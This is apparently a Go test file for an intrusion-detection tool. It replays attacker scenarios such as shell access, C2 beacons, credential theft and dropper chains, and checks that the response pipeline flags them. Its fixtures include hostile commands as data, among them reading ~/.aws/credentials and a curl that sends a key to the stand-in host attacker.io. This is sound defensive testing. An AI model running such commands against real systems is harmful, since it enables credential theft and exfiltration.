// Package redteam holds end-to-end attacker-narrative tests that
// wire multiple xhelix packages together and verify the
// PROTECTED_SERVICES_TRAP.md §13 acceptance criteria pass on the
// in-process pipeline.
//
// What this package can prove (in pure Go, no Linux required):
//   - takeover.Planner + decision.Plan emit the right ActionPlan
//     for a given attacker signal stream
//   - response.Executor dispatches the plan to the right backends
//   - forensic.Store + CoEngine produce the expected IOCs +
//     co-occurrence hits given JSON-lines input
//   - actionlog transitions are recorded with the right reasons
//
// What this package CANNOT prove (requires a real Linux host with
// eBPF / seccomp / AppArmor / systemd):
//   - seccomp denial actually returns -EPERM at the kernel
//   - AppArmor flags=(complain) audit lines appear in
//     /var/log/audit/audit.log
//   - bind-mount in PrivateMounts actually overlays /bin/sh
//   - bpf_override_return redirects connect() to the sinkhole
//   - The cost-asymmetry timing budget holds at scale
//
// See tests/redteam/README.md for the operator-facing manual test
// plan that exercises the second list on a real host.
package redteam

import (
	"context"
	"encoding/json"
	"net"
	"os"
	"path/filepath"
	"sync"
	"testing"
	"time"

	"github.com/xhelix/xhelix/pkg/actionlog"
	"github.com/xhelix/xhelix/pkg/daemon/forensicingest"
	"github.com/xhelix/xhelix/pkg/decision"
	"github.com/xhelix/xhelix/pkg/forensic"
	"github.com/xhelix/xhelix/pkg/model"
	"github.com/xhelix/xhelix/pkg/response"
	"github.com/xhelix/xhelix/pkg/takeover"
)

// ─────────────────────────────────────────────────────────────────
// Scenario 1 — Classic web exploit chain
//   Attacker lands RCE in nginx → spawns shell → cat /etc/shadow →
//   curl payload from C2 → execve dropper.
//   Expected: planner score ≥ 100 by end; Executor produces a
//   contained-tier plan when bastion+mirror available; actionlog
//   ends in Contained or Isolated.
// ─────────────────────────────────────────────────────────────────

func TestScenario_ClassicWebExploit(t *testing.T) {
	log := actionlog.New()
	planner := takeover.NewPlanner(takeover.PlannerConfig{
		State: log,
		PreconditionProbe: func() (bool, bool) { return true, true },
	})

	lineageID := uint64(42)
	at := time.Unix(1747706400, 0).UTC()

	// Step 1: attacker triggers shell exec — Tier-1 deterministic.
	planner.OnSignal(takeover.Signal{
		LineageID: lineageID, Kind: takeover.SignalShellAttempt,
		At: at, Source: "honeysh-trap", RemoteIP: "203.0.113.7",
	})
	// Step 2: attacker reads /etc/shadow (decoy fires).
	planner.OnSignal(takeover.Signal{
		LineageID: lineageID, Kind: takeover.SignalDecoyTouch,
		At: at.Add(15 * time.Second), Source: "decoyfs",
		Detail: "/etc/shadow",
	})
	// Step 3: attacker downloads via curl (Tier-1 downloader).
	planner.OnSignal(takeover.Signal{
		LineageID: lineageID, Kind: takeover.SignalDownloader,
		At: at.Add(30 * time.Second), Source: "honeysh-trap",
	})

	plan := planner.Plan(lineageID, at.Add(45*time.Second))
	if plan == nil {
		t.Fatal("plan must be emitted for shell+decoy+downloader stack")
	}
	if plan.Score < 90 {
		t.Fatalf("score=%d, want ≥ 90 after three Tier-1 signals", plan.Score)
	}
	if plan.Tier != "contained" {
		t.Fatalf("tier=%q, want contained (bastion+mirror probe true)", plan.Tier)
	}
	if !plan.IsolateHost {
		t.Fatal("contained plan must set IsolateHost when preconditions met")
	}
	if !plan.SuspendProcess || !plan.Memscan || !plan.Snapshot {
		t.Fatalf("contained plan missing core actions: %v", plan.Actions())
	}
}

// ─────────────────────────────────────────────────────────────────
// Scenario 2 — Reverse-shell beacon (Ring 2 sinkhole catches it)
//   Attacker connects out to known-bad C2 → daemon sinkholes → JSON
//   captures host + JA3.
//   Expected: forensic.Store records SNI + JA3; co-occurrence rule
//   cooccur.fingerprinted_callback fires within the window.
// ─────────────────────────────────────────────────────────────────

func TestScenario_SinkholeCapturesC2Beacon(t *testing.T) {
	dir := t.TempDir()
	store := forensic.NewStore()
	co := forensic.NewCoEngine(forensic.DefaultCoRules())

	hits := &hitsBag{}
	ing := forensicingest.New(forensicingest.Config{
		Dir:          dir,
		ScanInterval: 30 * time.Millisecond,
		PollInterval: 30 * time.Millisecond,
	}, store, co, hits.add)

	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	go ing.Run(ctx)

	// Simulate sinkhole capturing the beacon: emit beacon_start
	// (SNI + JA3 from TLS ClientHello) + beacon_data (HTTP host).
	lines := []string{
		`{"type":"beacon_start","body":{"beacon_id":"b1","peer_addr":"203.0.113.7:443","sni":"c2.evil.example.com","ja3":"771,4865-4866,0-23-65281","ja3_hash":"e7d705a3286e19ea42f587b344ee6865"}}`,
		`{"type":"beacon_data","body":{"beacon_id":"b1","at":"2026-05-20T10:00:01Z","http_host":"c2.evil.example.com","user_agent":"BadMalware/1.0","payload":"GET /beacon","is_text":true,"sha256":"abcd"}}`,
	}
	writeJSONL(t, filepath.Join(dir, "sinkhole.jsonl"), lines...)

	waitFor(t, 2*time.Second, func() bool {
		return store.Get(forensic.KindJA3, "e7d705a3286e19ea42f587b344ee6865") != nil &&
			store.Get(forensic.KindDomain, "c2.evil.example.com") != nil
	}, "JA3 + domain in store")

	// cooccur.fingerprinted_callback needs JA3 + BeaconHost from
	// same source within 5min. Both arrived under beacon_id=b1.
	waitFor(t, 2*time.Second, func() bool {
		return hits.has("cooccur.fingerprinted_callback")
	}, "fingerprinted_callback co-occurrence hit")
}

// ─────────────────────────────────────────────────────────────────
// Scenario 3 — Credential exfiltration (decoy AWS creds touched)
//   Attacker reads ~/.aws/credentials (decoy returns AKIA fake);
//   later observed via outbound URL to a credential-test endpoint.
//   Expected: AWSKey + URL in store; cooccur.cred_exfil_chain fires.
// ─────────────────────────────────────────────────────────────────

func TestScenario_CredExfilChain(t *testing.T) {
	dir := t.TempDir()
	store := forensic.NewStore()
	co := forensic.NewCoEngine(forensic.DefaultCoRules())
	hits := &hitsBag{}
	ing := forensicingest.New(forensicingest.Config{
		Dir:          dir,
		ScanInterval: 30 * time.Millisecond,
		PollInterval: 30 * time.Millisecond,
	}, store, co, hits.add)
	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Second)
	defer cancel()
	go ing.Run(ctx)

	// Same session: honey-sh records the attacker's "cat ~/.aws/
	// credentials" + later "curl https://attacker.io/auth/check".
	// The actual AKIA value comes from decoyfs.
	lines := []string{
		`{"type":"command","body":{"session_id":"sess9","at":"2026-05-20T10:00:00Z","raw":"cat ~/.aws/credentials","command":"cat","response":"AKIAIOSFODNN7EXAMPLE\nwJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"}}`,
		`{"type":"command","body":{"session_id":"sess9","at":"2026-05-20T10:00:30Z","raw":"curl https://attacker.io/auth/check -H AKIAIOSFODNN7EXAMPLE","command":"curl","urls":["https://attacker.io/auth/check"]}}`,
	}
	writeJSONL(t, filepath.Join(dir, "honeysh.jsonl"), lines...)

	waitFor(t, 2*time.Second, func() bool {
		return store.Get(forensic.KindAWSKey, "AKIAIOSFODNN7EXAMPLE") != nil &&
			store.Get(forensic.KindURL, "https://attacker.io/auth/check") != nil
	}, "AWS key + URL in store")

	waitFor(t, 2*time.Second, func() bool {
		return hits.has("cooccur.cred_exfil_chain")
	}, "cred_exfil_chain co-occurrence hit")
}

// ─────────────────────────────────────────────────────────────────
// Scenario 4 — Persistence attempt (forbidden write)
//   Attacker tries to write to /etc/cron.d/.
//   Expected: planner sees SignalForbiddenWrite (Tier-1, weight 80);
//   single-signal alone crosses Suspended threshold.
// ─────────────────────────────────────────────────────────────────

func TestScenario_PersistenceAttempt(t *testing.T) {
	log := actionlog.New()
	planner := takeover.NewPlanner(takeover.PlannerConfig{State: log})

	lineageID := uint64(7)
	at := time.Unix(1747706400, 0).UTC()
	planner.OnSignal(takeover.Signal{
		LineageID: lineageID, Kind: takeover.SignalForbiddenWrite,
		At: at, Source: "apparmor", Detail: "/etc/cron.d/backdoor",
	})

	plan := planner.Plan(lineageID, at.Add(time.Second))
	if plan == nil {
		t.Fatal("forbidden_write Tier-1 alone must emit a plan")
	}
	if plan.Tier != "suspended" {
		t.Fatalf("tier=%q want suspended", plan.Tier)
	}
	if !plan.SuspendProcess {
		t.Fatal("suspended plan must set SuspendProcess")
	}
}

// ─────────────────────────────────────────────────────────────────
// Scenario 5 — Anti-forensics (dropper chain co-occurrence)
//   Attacker: base64 -d payload + chmod +x /tmp/dropper.
//   Each signal Tier-2 alone (~35-45); together within 60s, the
//   P-PS.22 cooccur.dropper_chain rule adds +30 → cross suspended.
// ─────────────────────────────────────────────────────────────────

func TestScenario_DropperChainCooccurrence(t *testing.T) {
	log := actionlog.New()
	planner := takeover.NewPlanner(takeover.PlannerConfig{State: log})

	lineageID := uint64(11)
	at := time.Unix(1747706400, 0).UTC()
	planner.OnSignal(takeover.Signal{
		LineageID: lineageID, Kind: takeover.SignalBase64Decode,
		At: at, Source: "protectpolicy",
	})
	// Within the 60s dropper_chain window.
	planner.OnSignal(takeover.Signal{
		LineageID: lineageID, Kind: takeover.SignalChmodExec,
		At: at.Add(30 * time.Second), Source: "protectpolicy",
	})

	plan := planner.Plan(lineageID, at.Add(45*time.Second))
	if plan == nil {
		t.Fatal("dropper-chain stack must emit a plan")
	}
	// 35 + 45 + 30 bonus = 110 → clamp to 100 → contained.
	// But without bastion probe, downgrades to isolated.
	if plan.Tier != "isolated" {
		t.Fatalf("tier=%q want isolated (no bastion preconditions)", plan.Tier)
	}
	if plan.Score < 75 {
		t.Fatalf("score=%d want ≥75 (with co-occurrence bonus)", plan.Score)
	}
}

// ─────────────────────────────────────────────────────────────────
// Scenario 6 — End-to-end: plan → executor → backend dispatch
//   Build a real Engine with mock backends, send a Suspend plan
//   from the planner, verify Executor calls the expected do*
//   methods + records the actionlog transition.
// ─────────────────────────────────────────────────────────────────

type capturedBackend struct {
	bans    []string
	armed   bool
	snaps   int
}

type capNetBanner struct{ b *capturedBackend }

func (c *capNetBanner) Ban(ip net.IP, reason string, ttl time.Duration) error {
	c.b.bans = append(c.b.bans, ip.String())
	return nil
}
func (c *capNetBanner) Unban(net.IP) error      { return nil }
func (c *capNetBanner) List() ([]string, error) { return nil, nil }

type capHostBanner struct{ b *capturedBackend }

func (c *capHostBanner) Quarantined() bool { return c.b.armed }
func (c *capHostBanner) EngageQuarantine(_ context.Context, _ []string) error {
	c.b.armed = true
	return nil
}

type capSnapshotter struct{ b *capturedBackend }

func (c *capSnapshotter) Capture(pid int, comm, ruleID string) (string, error) {
	c.b.snaps++
	return "/tmp/snap.json", nil
}

func TestScenario_PlanExecutorDispatchEndToEnd(t *testing.T) {
	cap := &capturedBackend{}
	engine := response.New(response.Config{
		NetBanner:    &capNetBanner{b: cap},
		HostBanner:   &capHostBanner{b: cap},
		HostAllowIPs: []string{"10.0.0.1"},
		Snapshotter:  &capSnapshotter{b: cap},
	})
	exec := response.NewExecutor(engine)

	plan := decision.NewContain("alert-1", "plan-1", 100,
		[]string{"bastion_count>=2", "off_host_mirror"})
	plan.Reasons = []string{"attribution"}
	alert := mkAlert("203.0.113.5")
	res := exec.Execute(context.Background(), plan, alert)

	if res == nil {
		t.Fatal("Execute must return a Result")
	}
	if cap.snaps != 1 {
		t.Errorf("Snapshotter calls=%d want 1", cap.snaps)
	}
	if !cap.armed {
		t.Error("HostBanner should be armed (IsolateHost)")
	}
	if len(cap.bans) != 1 || cap.bans[0] != "203.0.113.5" {
		t.Errorf("NetBanner calls=%v want one ban of 203.0.113.5", cap.bans)
	}
}

// ─────────────────────────────────────────────────────────────────
// helpers
// ─────────────────────────────────────────────────────────────────

func mkAlert(srcIP string) model.Alert {
	ev := model.NewEvent("redteam", model.SeverityHigh)
	ev.PID = 1234
	ev.Comm = "nginx"
	ev.Image = "/usr/sbin/nginx"
	ev.Tags["src_ip"] = srcIP
	ev.Tags["dst_ip"] = srcIP
	return model.Alert{Event: ev, RuleID: "takeover.composite"}
}

func writeJSONL(t *testing.T, path string, lines ...string) {
	t.Helper()
	f, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0o600)
	if err != nil {
		t.Fatal(err)
	}
	defer f.Close()
	for _, l := range lines {
		// Sanity-check it's valid JSON before writing — catches
		// scenario-data typos early.
		var v map[string]any
		if err := json.Unmarshal([]byte(l), &v); err != nil {
			t.Fatalf("scenario JSONL malformed: %v\n%s", err, l)
		}
		if _, err := f.WriteString(l + "\n"); err != nil {
			t.Fatal(err)
		}
	}
}

// hitsBag is a mutex-guarded slice of forensic.Hit used by tests
// that read from a Tick goroutine. Replaces the raw `var hits
// []forensic.Hit` pattern that races under -race.
type hitsBag struct {
	mu   sync.Mutex
	hits []forensic.Hit
}

func (h *hitsBag) add(hit forensic.Hit) {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.hits = append(h.hits, hit)
}

func (h *hitsBag) has(ruleID string) bool {
	h.mu.Lock()
	defer h.mu.Unlock()
	for _, x := range h.hits {
		if x.RuleID == ruleID {
			return true
		}
	}
	return false
}

func waitFor(t *testing.T, max time.Duration, cond func() bool, label string) {
	t.Helper()
	deadline := time.Now().Add(max)
	for time.Now().Before(deadline) {
		if cond() {
			return
		}
		time.Sleep(20 * time.Millisecond)
	}
	t.Fatalf("%s: never satisfied within %s", label, max)
}
